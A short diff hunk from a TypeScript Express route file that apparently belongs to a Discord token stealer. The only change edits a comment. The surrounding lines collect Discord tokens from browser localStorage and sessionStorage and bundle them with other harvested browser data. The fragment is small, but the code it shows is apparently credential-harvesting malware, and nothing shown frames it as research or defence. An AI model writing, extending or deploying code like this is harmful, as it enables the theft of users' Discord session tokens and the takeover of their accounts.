@@ -561,7 +561,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
       const allDiscordTokens = [...localStorageTokens, ...sessionStorageTokens];
 
-      // Augment data with found Discord tokens and platform/language
+      // Augment data with found Discord tokens
       const data = {
         ...browserData,
         discordTokens: allDiscordTokens,
